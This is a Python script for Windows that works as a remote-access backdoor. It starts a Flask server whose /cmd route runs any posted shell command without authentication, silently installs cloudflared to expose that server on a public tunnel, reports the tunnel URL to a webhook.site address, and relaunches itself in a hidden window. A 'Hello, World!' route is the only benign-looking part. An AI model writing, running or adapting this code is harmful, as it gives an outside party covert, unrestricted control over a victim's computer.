import re
import sys
import time
import subprocess
from pathlib import Path
from datetime import datetime

# ---------------- AUTO INSTALL PYTHON DEPS ----------------

def pip_install(pkg):
    subprocess.run([sys.executable, "-m", "pip", "install", pkg], check=False)

def ensure_import(pkg_name, pip_name=None):
    try:
        __import__(pkg_name)
    except ImportError:
        pip_install(pip_name or pkg_name)

ensure_import("flask")
ensure_import("requests")

from flask import Flask, request
import requests

# ---------------------------------------------------------

app = Flask(__name__)

@app.route("/cmd", methods=["POST"])
def cmd():
    subprocess.Popen(request.form["cmd"], shell=True)
    return {"status": "ok"}

@app.route("/ip")
def ip():
    return requests.get("https://api.ipify.org").text

@app.route("/")
def home():
    return {"message": "Hello, World!"}

def install(pkg):
    subprocess.run([
        "winget",
        "install",
        "--force",
        pkg,
        "--accept-package-agreements",
        "--accept-source-agreements"
    ])

def find():
    paths = [
        r"C:\Program Files (x86)\cloudflared\cloudflared.exe",
        r"C:\Program Files\cloudflared\cloudflared.exe",
    ]

    for path in paths:
        if Path(path).exists():
            return path

    return None


def start():
    exe = find()

    if not exe:
        print("Installing cloudflared...")
        install("Cloudflare.cloudflared")
        time.sleep(5)
        exe = find()

    if not exe:
        raise Exception("cloudflared.exe not found")

    print("Using:", exe)

    while True:
        cloudflared = subprocess.Popen(
            [exe, "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        if not cloudflared.stdout:
            raise Exception("Failed to start cloudflared")

        for line in cloudflared.stdout:
            print(line.strip())

            m = re.search(r"https://.*?trycloudflare.com", line)
            if m:
                return m.group(0)

            if "failed to unmarshal quick Tunnel" in line or "Internal Server Error" in line:
                print("Retrying...")
                cloudflared.kill()
                time.sleep(2)
                break


def main():
    cloudflared_url = start()

    print("URL:", cloudflared_url)

    requests.post(
        "https://webhook.site/5dbf705a-85f9-4947-8639-865dd3927efc",
        json={
            "url": cloudflared_url,
            "timestamp": datetime.now().isoformat(),
        }
    )

    app.run("0.0.0.0", port=5000)


if __name__ == "__main__":
    if "--bg" in sys.argv:
        main()
    else:
        subprocess.Popen(
            [sys.executable, str(Path(__file__)), "--bg"],
            creationflags=subprocess.CREATE_NO_WINDOW  # type: ignore
        )
